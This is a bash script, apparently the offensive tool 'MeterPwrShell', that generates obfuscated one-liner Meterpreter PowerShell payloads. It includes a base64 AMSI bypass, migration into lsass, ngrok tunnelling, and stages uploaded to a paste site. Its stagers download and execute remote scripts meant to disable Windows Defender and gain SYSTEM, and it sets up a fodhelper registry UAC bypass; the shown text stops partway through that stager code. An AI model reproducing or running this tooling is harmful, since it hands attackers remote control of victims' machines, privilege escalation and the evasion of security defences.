#!/usr/bin/bash
#----------colors and configs----------
okegreen='\033[92m' #goddamn it please dont fucking change it
red='\e[1;31m' #goddamn it please dont fucking change it
BlueF='\e[1;34m' #goddamn it please dont fucking change it
COWSAYFILE=/usr/bin/cowsay #goddamn it please dont fucking change it
COWSAYFILESOURCE=`which cowsay` #you can change this as you want
AMSIBYPASSCODEINBASE64="WwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuACcAKwAkACgAWwBjAEgAQQByAF0AKABbAEIAeQBUAEUAXQAwAHgANAAxACkAKwBbAGMASABBAHIAXQAoAFsAYgB5AHQAZQBdADAAeAA2AEQAKQArAFsAQwBoAEEAUgBdACgAMQAxADUAKQArAFsAYwBoAGEAcgBdACgAWwBiAFkAdABFAF0AMAB4ADYAOQApACkAKwAnAFUAdABpAGwAcwAnACkALgBHAGUAdABGAGkAZQBsAGQAKAAkACgAWwBzAHkAcwB0AGUATQAuAE4ARQBUAC4AVwBFAGIAVQB0AEkAbABpAFQAWQBdADoAOgBIAHQATQBsAGQARQBDAG8ARABlACgAJwAmACMAOQA3ADsAJgAjADEAMAA5ADsAJgAjADEAMQA1ADsAJgAjADEAMAA1ADsAJgAjADcAMwA7ACYAIwAxADEAMAA7ACYAIwAxADAANQA7ACYAIwAxADEANgA7ACYAIwA3ADAAOwAmACMAOQA3ADsAJgAjADEAMAA1ADsAJgAjADEAMAA4ADsAJgAjADEAMAAxADsAJgAjADEAMAAwADsAJwApACkALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwA="
ATTACKERARCH=`dpkg --print-architecture` #goddamn it please dont fucking change it
DETECTINTERNETCONNECTION=yes #not recommended to change it but you can change it to "no"
DETECTATTACKERLINUXDISTRIBUTION=yes #not recommended to change it but you can change it to "no"
ENABLEROOTDETECTOR=yes #not recommended to change it but you can change it to "no"
SESSIONID=$RANDOM #goddamn it please dont fucking change it
VERSION=v2.0.0 #goddamn it please dont fucking change it
boldcharacters=$(tput bold) #this variable is needed cause some of the text was not bolded automaticly
#------------colors and configs----------
#use this func for checking wether the directory is empty or not
isthatempty ()
{
    local dir="$1"
    shopt -s nullglob
    local files=( "$dir"/* "$dir"/.* )
    [[ ${#files[@]} -eq 2 ]]
}
#fakeroot detector....bruhhh
fakeroot_detector ()
{
for path in ${LD_LIBRARY_PATH//:/ }; do
        if [[ "$path" == *libfakeroot ]]; then
            usingfakeroot=yes
            break
        fi
done
}
#execute this func if we detect control-c pressed
control-cexit ()
{
echo ""
echo -e $red "[!!!] Control-C Catched [!!!]"
echo -e $red "Removing Undone Files If Exist ..."
rm 1xencrypted.ps1 &> /dev/null
rm 1.ps1 &> /dev/null
rm dontremove.txt &> /dev/null
rm xencrypt.ps1 &> /dev/null
if [ -d "output/" ]; then
    if isthatempty output/; then
        rm output -rf &> /dev/null
    fi
fi
read -t 1
echo -e $red "Exiting ..."
exit
}
#control-c catcher/detector
trap control-cexit SIGINT
#function for checking payload inputs
checkmeterpreterpayload ()
{
cat << !
 Generate PowerShell Payload Input
 +-------------------------++-------------------------++-----------------------+
 | Name                    ||  Descript               || Your Input
 +-------------------------++-------------------------++-----------------------+
 | LHOST                   ||  The Listen Address     || $yourip
 | LPORT                   ||  The Listen Ports       || $yourport
 | PAYFILETYPE             ||  The Payload Type       || $msfpaytype
 | ARCH                    ||  The Payload Arch       || $payarch
 | USE PREPENDMIGRATE      ||  Use PrependMigrate     || $useprependmigrate
 +-------------------------++-------------------------++-----------------------+
!
}

bannerrandomizer ()
{
array[0]="iloveyoushell" #kiss
array[1]="iseeanintruder" #eyes
array[2]="waftdh" #tux (we are forced to do hackings)
array[3]="normalfiglet" #figlet (MeterPwrShell)
array[4]="PowersHell" #Powers HELL

size=${#array[@]}
index=$(($RANDOM % $size))
banner=${array[$index]}
}

centerthebanner ()
{
    columns="$(tput cols)"
    while IFS= read -r line; do
        printf "%*s\n" $(( (${#line} + columns) / 4)) "$line"
    done < "$1"
}

showbanner ()
{
if [ "$banner" = "iloveyoushell" ]; then
    cowsay -f kiss "I Love You,Shell" 1>> banner.txt 2>> .debug.log
    centerthebanner "banner.txt"
    rm banner.txt
elif [ "$banner" = "iseeanintruder" ]; then
    cowsay -f eyes "I See An Intruder !!!" 1>> banner.txt 2>> .debug.log
    centerthebanner "banner.txt"
    rm banner.txt
elif [ "$banner" = "waftdh" ]; then
    cowsay -f tux "We Are Forced To Do Hacking,Aren't We ???" 1>> banner.txt 2>> .debug.log
    centerthebanner "banner.txt"
    rm banner.txt
elif [ "$banner" = "normalfiglet" ]; then
    figlet "...MeterPwrShell..." 1>> banner.txt 2>> .debug.log
    centerthebanner "banner.txt"
    rm banner.txt
elif [ "$banner" = "PowersHell" ]; then
    figlet "...PowersHELL..." 1>> banner.txt 2>> .debug.log
    centerthebanner "banner.txt"
    rm banner.txt
fi
}
#flags options
getopts ":c:" opt
case $opt in
  c)
    if [[ $OPTARG = "help" ]]; then
        echo -e $BlueF "Available arguments : help, version, showbanner, showlastdebuglog, disablerootdetector, disableinternetdetector, disablealldetector"
        echo -e $BlueF "help : Show this page"
        echo -e $BlueF "version : Show MeterPwrShell's version"
        echo -e $BlueF "showbanner : Show MeterPwrShell's Banner"
        echo -e $BlueF "showlastdebuglog : Well,Its kinda self-explanatory tho"
        echo -e $BlueF "disablerootdetector : Well,Its kinda self-explanatory tho"
        echo -e $BlueF "disableinternetdetector : Well,Its kinda self-explanatory tho"
        echo -e $BlueF "disablealldetector : Disable all detector except Linux distribution detector"
        exit
    elif [[ $OPTARG = "version" ]]; then
        echo -e $BlueF "Version : $VERSION"
        echo -e $BlueF "Codename : SantetOnline"
        exit
    elif [[ $OPTARG = "showlastdebuglog" ]]; then
        if [[ -f .debug.log ]]; then
            echo -e $BlueF "Press 'q' to exit debug.log"
            read -t 1
            less .debug.log
        else
            echo -e $red "Sorry,debug.log Didn't Exist!"
        fi
        exit
    elif [[ $OPTARG = "disablerootdetector" ]]; then
        unset ENABLEROOTDETECTOR
        ENABLEROOTDETECTOR=no
        echo -e $BlueF "Starting MeterPwrShell Without Root Detector . . ."
        read -t 0.75
    elif [[ $OPTARG = "disableinternetdetector" ]]; then
        unset DETECTINTERNETCONNECTION
        DETECTINTERNETCONNECTION=no
        echo -e $BlueF "Staring MeterPwrShell Without Internet Connection Detector . . ."
        read -t 0.75
    elif [[ $OPTARG = "disablealldetector" ]]; then
        unset ENABLEROOTDETECTOR
        unset DETECTINTERNETCONNECTION
        ENABLEROOTDETECTOR=no
        DETECTINTERNETCONNECTION=no
        echo -e $BlueF "Starting MeterPwrShell Without Internet Connection Detector And Root Detector . . ."
        read -t 0.75
    elif [[ $OPTARG = "showbanner" ]]; then
        echo -e $okegreen "${boldcharacters} [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
        echo -e $okegreen "  [---Generate OneLiner Meterpreter Powershell Payload With Base64 Encoded---]  "
        bannerrandomizer
        showbanner
        echo -e $okegreen "                [---] Tool Programmed By GetRektBoy724 [---]                 "
        echo -e $okegreen "                [---]     Codename : SantetOnline      [---]                 "
        echo -e $okegreen "                [---]        Version : $VERSION          [---]                 "
        echo -e $okegreen "         [---] Follow Me At : https://github.com/GetRektBoy724 [---]         "
        exit
    else
        echo -e $red "What do you mean m8?"
        exit
    fi
    ;;
  :)
    echo -e $red "Available arguments : help, version, showlastdebuglog, disablerootdetector, disableinternetdetector, disablealldetector, showbanner"
    echo -e $red "Please provide one argument!!!"
    exit
    ;;
esac
#deleting old .debug.log
rm .debug.log &> /dev/null
touch .debug.log &> /dev/null
#[-------------------------BEGIN .debug.log ZONE-------------------------]
#session id
echo "#SESSION ID NUMBER : $SESSIONID" &>> .debug.log
#write program configs on .debug.log
echo "#ProgramConfigs" &>> .debug.log
echo "COWSAYFILESOURCE = $COWSAYFILESOURCE" &>> .debug.log
echo "AMSIBYPASSCODEINBASE64 (default) = $AMSIBYPASSCODEINBASE64" &>> .debug.log
echo "ATTACKERARCH = $ATTACKERARCH" &>> .debug.log
echo "DETECTINTERNETCONNECTION = $DETECTINTERNETCONNECTION" &>> .debug.log
echo "DETECTATTACKERLINUXDISTRIBUTION = $DETECTATTACKERLINUXDISTRIBUTION" &>> .debug.log
echo "ENABLEROOTDETECTOR = $ENABLEROOTDETECTOR" &>> .debug.log
#root detector
if [ $ENABLEROOTDETECTOR = yes ]; then
    if [ $(id -u) -ne 0 ]; then
        echo -e $red "Oopsie Doopsie You Are Not Root...lmao\nTry This You Goddamn Script Kiddie : \n'sudo ./meterpwrshellexec'\nNah Im Just Joking,Dont Be Mad :)"
        exit 1
    else
        echo -e $BlueF "[---] You're Root,Come On In :) [---]"
        fakeroot_detector
        if [[ $usingfakeroot = "yes" ]]; then
            echo -e $red "[---] But You're Using Fakeroot...GTFO !!! [---]"
            exit
        fi
    fi
elif [[ $ENABLEROOTDETECTOR = no ]]; then
    echo -e $red "[!!!WARNING!!!] THE PROGRAM MAYBE WILL BROKE IF YOU DONT HAVE ROOT PERMISSION !!! [!!!WARNING!!!] "
    while true; do
        echo -ne $red "[!!!] DO YOU WANT TO CONTINUE ??? (yes/no) [!!!] : ";tput sgr0
        read continuewithoutroot
        if [ "$continuewithoutroot" = "yes" ]; then
            echo -e $red "Continuing ..."
            read -t 2
            break
        fi
        if [ "$continuewithoutroot" = "no" ]; then
            echo -e $red "Okie Dokie Then :)"
            echo -e $red "Exiting ..."
            read -t 1
            exit 1
        else
            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
        fi
    done
fi
#linux distribution detector
if [ $DETECTATTACKERLINUXDISTRIBUTION = "yes" ]; then
    ATTACKERLINUXDISTRIBUTION=`lsb_release -i | cut -f 2-`
    if [ $ATTACKERLINUXDISTRIBUTION = "Kali" ]; then
        echo "#linux distribution supported" &>> .debug.log
        echo -e $BlueF "[---] Linux Distribution Supported [---]"
        echo "#linux distribution = kali" &>> .debug.log
    elif [ $ATTACKERLINUXDISTRIBUTION = "Debian" ]; then
        echo "#linux distribution supported" &>> .debug.log
        echo -e $BlueF "[---] Linux Distribution Supported [---]"
        echo "#linux distribution = debian" &>> .debug.log
    elif [ $ATTACKERLINUXDISTRIBUTION = "Ubuntu" ]; then
        echo "#linux distribution supported" &>> .debug.log
        echo -e $BlueF "[---] Linux Distribution Supported [---]"
        echo "#linux distribution = ubuntu" &>> .debug.log
    elif [ $ATTACKERLINUXDISTRIBUTION = "Ether" ]; then
        echo "#linux distribution supported" &>> .debug.log
        echo -e $BlueF "[---] Linux Distribution Supported [---]"
        echo "#linux distribution = etherlinux" &>> .debug.log
    else
        echo "#linux distribution unsupported" &>> .debug.log
        echo "#linux distribution = $ATTACKERLINUXDISTRIBUTION" &>> .debug.log
        echo -e $red "[!!!WARNING!!!] YOUR LINUX DISTRIBUTION, $ATTACKERLINUXDISTRIBUTION, IS UNSUPPORTED [!!!WARNING!!!]"
        echo -e $red "[!!!WARNING!!!] THIS PROGRAM ONLY SUPPORT DEBIAN,UBUNTU,ETHER LINUX,AND KALI LINUX DISTRIBUTION [!!!WARNING!!!]"
        echo -e $red "Exiting ..."
        read -t 2
        exit 1
    fi
fi
#internet connection detector
if [ $DETECTINTERNETCONNECTION = "yes" ]; then
    wget -q --spider http://google.com
    if [ $? -eq 0 ]; then
        echo -e $BlueF "[---] Internet Connection : Alive [---]"
        read -t 1
        echo "#internet connection : alive" &>> .debug.log
        internetconnection="alive"
    else
        echo -e $red "[!!!] Internet Connection : Dead [!!!]"
        echo -e $red "[!!!] THIS TOOL NEED INTERNET CONNECTION [!!!]"
        echo -e $red "[!!!] IF YOU DONT WANT TO USE INTERNET,ADD -c disableinternetdetector AFTER ./meterpwrshellexec [!!!]"
        echo -e $red "Exiting ..."
        read -t 2
        exit 1
    fi
fi
if [ $DETECTINTERNETCONNECTION = "no" ]; then
    echo -e $red "[!!!WARNING!!!] THE PROGRAM MAYBE WILL BROKE IF YOU DONT HAVE INTERNET !!! [!!!WARNING!!!] "
    while true; do
        echo -ne $red "[!!!] DO YOU WANT TO CONTINUE ??? (yes/no) [!!!] : ";tput sgr0
        read continuewithoutinternet
        if [ "$continuewithoutinternet" = "yes" ]; then
            echo -e $red "Continuing ..."
            read -t 2
            echo "#internet connection : unsure" &>> .debug.log
            internetconnection="unsure"
            break
        fi
        if [ "$continuewithoutinternet" = "no" ]; then
            echo -e $red "Okie Dokie Then :)"
            echo -e $red "Exiting ..."
            read -t 2
            exit 1
        else
            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
        fi
    done
fi
#installing prequisite
echo -e $BlueF " [------------------------------------------]"
echo -e $BlueF "[---] Checking dependencies... [---]"
for dependencies in wget curl cowsay figlet; do
    [[ $(which $dependencies 2>/dev/null) ]] || { echo -e $red "[!!!] $dependencies : NOT OK [!!!]";missingdependencies="$dependencies";deps=1; }
    [[ $deps -ne 1 ]] && echo -e $BlueF "[---] $dependencies : OK [---]" || { 
        while true; do
            echo -e $red "[!!!] The Program Might Be Broke If You Have Missing Dependencies [!!!]"
            echo -ne $red "[---] Do You Want To Install $missingdependencies ? (yes/no) : "
            read installmissingdependencies
            if [[ $installmissingdependencies = "yes" ]]; then
                if [[ $missingdependencies = "cowsay" ]]; then
                    echo -e $BlueF "[---] Installing $missingdependencies ... [---]"
                    echo "#installing $missingdependencies with apt command" &>> .debug.log
                    apt-get install cowsay &>> .debug.log
                    ln -s $COWSAYFILESOURCE $COWSAYFILE &>> .debug.log
                else
                    echo -e $BlueF "[---] Installing $missingdependencies ... [---]"
                    echo "#installing $missingdependencies with apt command" &>> .debug.log
                    apt-get install $missingdependencies &>> .debug.log
                fi
                break
            elif [[ $installmissingdependencies = "no" ]]; then
                echo -e $BlueF "Okie Dokie Then :)"
                break
            else
                echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
            fi
        done
    }
done
while true; do
    if [ -d "output/" ]; then
        if ! isthatempty output/; then
            echo -ne $BlueF "Do You Want To Delete The Old output/ Directory (yes/no) : "
            read outputdirectorybackup
            if [ "$outputdirectorybackup" = "no" ] ; then
                echo -e $BlueF "Okie Dokie Than :)"
                break
            fi
            if [ "$outputdirectorybackup" = "yes" ] ; then
                echo -e $BlueF "Okie Dokie Than :)"
                echo -e $BlueF "Removing And Continuing ......"
                echo "#removing old output/ directory" &>> .debug.log
                rm -rf output/ &>> .debug.log
                read -t 3
                break
            else
                echo -e $red " [!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
            fi
        else
            break
        fi
    else
        break
    fi
done
#checking metasploit framework and installing required msf modules
echo -e $BlueF " [------------------------------------------]"
echo -e $BlueF "[---] Installing And Adding The Required MSF Modules ...... [---]"
echo -e $red "[---] !!!Make Sure You already Install Metasploit-Framework!!! [---]"
echo -e $BlueF "[---] Just Enter It Blank If You Want To Use Default Metasploit Framework Directory Path [---]" 
echo -e $BlueF "[---] Default Metasploit-Framework Directory Path : /usr/share/metasploit-framework [---]"
echo -e $BlueF "[---] Example : /path/to/metasploit-framework [---]"
while true; do
    echo -ne $BlueF " YOUR METASPLOIT-FRAMEWORK DIRECTORY PATH WITHOUT SLASH ON THE BACKEND : ";tput sgr0
    read msfpath
    if [ -n "$msfpath" ]; then
        if [ -f "$msfpath/msfvenom" ]; then
            echo -e $BlueF "[---] MSF Venom Exist In Your Path,Continuing ...... [---]"
            read -t 2
            break
        else
            echo -e $red "[!!!WARNING!!!] MSF Venom Doesnt Exist In Your Path,Please Make Sure You Have Typed It Correctly!!! [!!!WARNING!!!]"
        fi
    fi
    if [ -z "$msfpath" ]; then
        msfpath=/usr/share/metasploit-framework
        if [ -f "$msfpath/msfvenom" ]; then
            echo -e $BlueF "[---] MSF Venom Exist In Your Path,Continuing ...... [---]"
            read -t 2
            break
        else
            echo -e $red "[!!!WARNING!!!] MSF Venom Doesnt Exist In Your Path,Please Make Sure You Have Typed It Correctly!!! [!!!WARNING!!!]"
        fi
    fi
done
mkdir output &>> .debug.log
clear
#menu/banner
echo ""
echo -e $okegreen "${boldcharacters} [---] MeterPwrshell - Meterpreter Powershell Payload With Base64 Encoded [---] "
echo -e $okegreen "  [---Generate OneLiner Meterpreter Powershell Payload With Base64 Encoded---]  "
bannerrandomizer
showbanner
echo -e $okegreen "                [---] Tool Programmed By GetRektBoy724 [---]                 "
echo -e $okegreen "                [---]     Codename : SantetOnline      [---]                 "
echo -e $okegreen "                [---]        Version : $VERSION         [---]                 "
echo -e $okegreen "         [---] Follow Me At : https://github.com/GetRektBoy724 [---]         "
echo -e $okegreen "                    [---] Session ID Number : $SESSIONID [---]                  "
echo -e $okegreen " [-----------------------------------------------------------] "
echo -e $okegreen "If You Want To Quit The Program...Just Press control-c!!"
echo -e $okegreen "!!!Make Sure There Are No Typos!!!"
echo -e $okegreen "Please Fill This Form First!!"
setpayloadvariables ()
{
echo -e $BlueF "Enter It Blank If You Want To Use Default Option"
echo -e $BlueF "[-----------------------------------------------------------] "
if grep -q "authtoken" $HOME/.ngrok2/ngrok.yml 2>> .debug.log; then
    ngrokauthtokenexist=yes
    echo -e $BlueF "Ngrok Authtoken Already Exist"
else
    ngrokauthtokenexist=no
    echo -e $BlueF "We Need Your Own Ngrok Authtoken!!!"
    echo -e $BlueF "You Can Get Your Ngrok Authtoken After Signing In And Go To https://dashboard.ngrok.com/get-started/setup"
    echo -ne $BlueF "What Is Your Ngrok Authtoken ??? : ";tput sgr0
    read ngrokauthtoken
fi
while true; do
    echo -e $BlueF "[-----------------------------------------------------------] "
    echo -ne $BlueF "SET MSF PAYLOAD TYPE : ";tput sgr0
    read msfpaytype
    echo -e $BlueF "[---] Checking Payload Availability . . . [---]"
    if msfvenom --list payload | grep -Fq "$msfpaytype"; then
        if msfvenom --list payload | grep "$msfpaytype" | grep -Fqv "staged"; then
            allowtouseprependmigrate="no"
        else
            allowtouseprependmigrate="yes"
        fi
        echo -e $BlueF "[---] Payload Available On Metasploit [---]"
        break
    else
        echo -e $red "[---] Payload Doest Exist On Metasploit !!! [---]"
    fi
done
while true; do 
    echo -e $BlueF " [--------------------] "
    echo -ne $BlueF "SET LHOST : ";tput sgr0
    read yourip
    ip=${1:-$yourip}
    re='^(0*(1?[0-9]{1,2}|2([0-4][0-9]|5[0-5]))\.){3}'
    re+='0*(1?[0-9]{1,2}|2([‌​0-4][0-9]|5[0-5]))$'
    if [[ $ip =~ $re ]]; then
        break
    else
        echo -e $red "[!!!WARNING!!!] IP IS NOT VALID [!!!WARNING!!!]"
    fi
done
while true; do
    echo -e $BlueF " [--------------------] "
    echo -ne $BlueF "SET LPORT (Recommended Port : 1023-65535) : ";tput sgr0
    read yourport
    re='^[0-9]+$'
    if ! [[ $yourport =~ $re ]] ; then
        echo -e $red "[!!!WARNING!!!] THIS IS NOT A VALID NUMBER,YOU QUNT [!!!WARNING!!!]"
    else
        if ((yourport > 0 && yourport <= 65535)); then
            break
        else
            echo -e $red "[!!!WARNING!!!] THIS IS NOT A VALID PORT NUMBER,YOU QUNT [!!!WARNING!!!]"
        fi
    fi
done
while true; do
    echo -e $BlueF " [--------------------] "
    echo -ne $BlueF "YOUR PAYLOAD ARCHITECTURE : ";tput sgr0
    read payarch
    if [[ $payarch = "x64" ]]; then
        break
    elif [[ $payarch = "x86" ]]; then
        break
    else
        echo -e $red "[!!!WARNING!!!] ARCHITECTURE IS NOT VALID [!!!WARNING!!!]"
    fi
done
if [[ $allowtouseprependmigrate = "no" ]]; then
    useprependmigrate="no"
    echo -e $red "[!!!] You Cant Use PrependMigrate On Stageless Payload [!!!]"
else
    while true; do
        echo -e $BlueF " [--------------------] "
        echo -ne $BlueF "Do You Want To Use PrependMigrate? (yes/no) : "
        read useprependmigrate
        if [[ $useprependmigrate = "yes" ]]; then
            break
        elif [[ $useprependmigrate = "no" ]]; then
            break
        else
            echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
        fi
    done
fi
echo -e $BlueF "[-----------------------------------------------------------] "
}
#loading variables
while true; do
    if [ -f .sessionvalues*/sessiontype.txt ]; then
        lastsessionid=`cat .sessionvalues*/sessionid.txt`
        custompayload=no
        yourip=`cat .sessionvalues*/lhost.txt`
        yourport=`cat .sessionvalues*/lport.txt`
        msfpaytype=`cat .sessionvalues*/msfpaytype.txt`
        payarch=`cat .sessionvalues*/payarch.txt`
        useprependmigrate=`cat .sessionvalues*/useprependmigrate.txt`
        if [[ $sessiontype = "custompayload" ]]; then
            checkcustompayload
        else
            checkmeterpreterpayload
        fi
        while true; do
            echo -ne $okegreen "Do You Want To Use Values From Last Session (Session ID : $lastsessionid) ??? (yes/no) : "
            read usevaluesfromlastsession
            if [[ $usevaluesfromlastsession = "yes" ]]; then
                echo -e $BlueF "Okie Dokie :) Continuing ..."
                break
            elif [[ $usevaluesfromlastsession = "no" ]]; then
                unset yourip
                unset yourport
                unset msfpaytype
                unset payarch
                unset useprependmigrate
                setpayloadvariables
                break
            else
                echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
            fi
        done
        break
    else
        setpayloadvariables
        break
    fi
done
if [ "$usevaluesfromlastsession" = no ]; then
    checkmeterpreterpayload
elif [ "$usevaluesfromlastsession" = yes ]; then
    checkmeterpreterpayload
else
    checkmeterpreterpayload
fi
while true; do
    echo -e $BlueF "The LHOST, LPORT, PAYLOAD, CUSTOMPAYLOADPATH, and *ARCH Values ​​Must Be Correct !!!"
    echo -ne $BlueF "Are The Values Are Correct ??? (yes/no) : "
    read isthevaluescorrect
    if [ "$isthevaluescorrect" = "no" ]; then
        echo -e $BlueF "Resetting All Variables ..."
        unset yourip
        unset yourport
        unset msfpaytype
        unset payarch
        unset useprependmigrate
        read -t 2
        echo -e $BlueF "[-----------------------------------------------------------] "
        setpayloadvariables
        break
    elif [ "$isthevaluescorrect" = yes ]; then
        echo -e $BlueF "Continuing ..."
        read -t 2
        echo -e $BlueF "[-----------------------------------------------------------] "
        break
    else
        echo -e $red "[!!!WARNING!!!] Wrong Input !!! [!!!WARNING!!!]"
    fi
done
#removing last session values directory after being used
rm .sessionvalues* -rf
#adds a hidden directory containing session values
mkdir .sessionvalues$SESSIONID
#saving variables
echo "$SESSIONID" &>> .sessionvalues$SESSIONID/sessionid.txt
echo "$msfpaytype" &>> .sessionvalues$SESSIONID/msfpaytype.txt
echo "$yourip" &>> .sessionvalues$SESSIONID/lhost.txt 
echo "$yourport" &>> .sessionvalues$SESSIONID/lport.txt
echo "$payarch" &>> .sessionvalues$SESSIONID/payarch.txt
echo "$useprependmigrate" &>> .sessionvalues$SESSIONID/useprependmigrate.txt
#storing values into .debug.log so people can easily see the variable values while troubleshooting
echo "#variablevalues" &>> .debug.log
echo "your metasploit framework path : $msfpath" &>> .debug.log
echo "msfpayload : $msfpaytype" &>> .debug.log
echo "lhost/yourip : $yourip" &>> .debug.log
echo "lport/yourport : $yourport" &>> .debug.log
echo "payloadarchitecture : $payarch" &>> .debug.log
echo "prependmigrate : $useprependmigrate" &>> .debug.log
echo -e $BlueF "Please Wait...This Is Probably Gonna Take A Few Minutes......Take A Cup Of Coffe Or Snack Maybe :)"
#making de payload process
generatepayloadwithprependmigrate () {
if [[ -f /usr/bin/ngrok ]]; then
    echo "#ngrok executeable already exist in /usr/bin" &>> .debug.log
else
    echo "#downloading ngrok executeable" &>> .debug.log
    wget https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip &>> .debug.log
    echo "#unzipping ngrok executeable zip" &>> .debug.log
    unzip ngrok-stable-linux-amd64.zip
    chmod +x ngrok
    echo "#moving ngrok executeable to /usr/bin" &>> .debug.log
    mv ngrok /usr/bin
    rm ngrok-stable-linux-amd64.zip
fi
if [[ "$ngrokauthtokenexist" = "no" ]]; then
    echo "#adding your authtoken to ngrok config file"&>> .debug.log
    ngrok authtoken $ngrokauthtoken &>> .debug.log
fi
rm ngrok.debug.log &>> .debug.log
echo "#ngrok started,you can view ngrok log at ngrok.debug.log" &>> .debug.log
if echo "$msfpaytype" | grep -Fq "http"; then
    ngrok http $yourport --log=stdout >> ngrok.debug.log &
else
    ngrok tcp $yourport --log=stdout >> ngrok.debug.log &
fi
read -t 10 #waiting ngrok to establish the connection,hopefully 10 second is enough
echo -e $BlueF "We Started The Ngrok Port Forwarder On The Background, You Can Kill It Later If You Dont Use It Anymore With : kill \$(pgrep ngrok)"
ngrokwebrequest=`curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"tcp:..([^"]*).*/\1/p'`
ngrokaddr=`echo $ngrokwebrequest | cut -f1 -d:`
ngrokport=`echo $ngrokwebrequest | cut -f2 -d:`
echo "#generating payload" &>> .debug.log
msfvenom -p $msfpaytype LHOST=$ngrokaddr LPORT=$ngrokport prependmigrateproc=lsass.exe prependmigrate=true --smallest -f psh -o .1.ps1 &>> .debug.log
msfpayloadlink=`curl -s --upload-file '.1.ps1' 'https://paste.c-net.org/'`
rm .1.ps1
AMSIBYPASSCODEINRAW=`echo $AMSIBYPASSCODEINBASE64 | base64 -d | iconv --to-code UTF8`
read -r -d '' stage3 <<- EOM 
\$procid = get-process lsass | select -expand id;
\$accesspsgetsys = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/psgetsys.ps1 -UseBasicParsing;
Invoke-Expression \$accesspsgetsys;
[AkuDitemeninOrangTuaKu]::MintakSYSTEMCuk(\$procid,"C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe","-nop -ep bypass -NoExit -Command \`"\`\$accessstartup = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/OneDoesNotSimplyBypassEntireWinDefender.ps1 -UseBasicParsing;Invoke-Expression \`\$accessstartup.Content;Invoke-Expression(New-Object Net.WebClient).DownloadString('$msfpayloadlink');\`"");
EOM
echo "#crafting UAC bypass" &>> .debug.log
echo "#uploading stager to paste.c-net.org" &>> .debug.log
stage3link=`wget --quiet -O- --post-data="$stage3" 'https://paste.c-net.org/'`
read -r -d '' encodecommand <<- EOM
powershell.exe -nop -ep bypass -Command "\$accessstartup = Invoke-WebRequest https://raw.githubusercontent.com/GetRektBoy724/sementara/master/UACBStartup.ps1 -UseBasicParsing;Invoke-Expression \$accessstartup.Content;Invoke-Expression(New-Object Net.WebClient).DownloadString('$stage3link');"
EOM
encodecommandinbase64=`echo -n "$encodecommand" | base64 | tr -d '\n'`
reverseencodecommandinbase64=`echo "$encodecommandinbase64" | rev`
AIObypass="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
AIObypassinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversecommandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversingcommandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reversingcommandinbase642="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reghiveinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
reghive="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
commandinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
command="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
processinbase64="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
process="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
accessAIObypass="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
program="\$$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 32 | head -n 1)"
read -r -d '' UACBYPASS <<- EOM
$AIObypassinbase64 = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0dldFJla3RCb3k3MjQvc2VtZW50YXJhL21hc3Rlci9PbmVEb2VzTm90U2ltcGx5QnlwYXNzRW50aXJlV2luRGVmZW5kZXIucHMx"
$AIObypass = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$AIObypassinbase64"))
$reghiveinbase64 = "SEtDVTpcU29mdHdhcmVcQ2xhc3Nlc1xtcy1zZXR0aW5nc1xTaGVsbFxPcGVuXGNvbW1hbmQ="
$reghive = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$reghiveinbase64"))
$reversecommandinbase64 = "$reverseencodecommandinbase64"
$reversingcommandinbase64 = $reversecommandinbase64.ToCharArray()
[array]::Reverse($reversingcommandinbase64)
$reversingcommandinbase642 = -join($reversingcommandinbase64)
$command = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$reversingcommandinbase642"))
$processinbase64 = "QzpcV2luZG93c1xTeXN0ZW0zMlxmb2RoZWxwZXIuZXhl"
$process = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("$processinbase64"))
$accessAIObypass = Invoke-WebRequest $AIObypass -UseBasicParsing
Invoke-Expression $accessAIObypass.Content
New-Item "$reghive" -Force
New-ItemProperty -Path "$reghive" -Name "DelegateExecute" -Value "" -Force
$program = "$command"
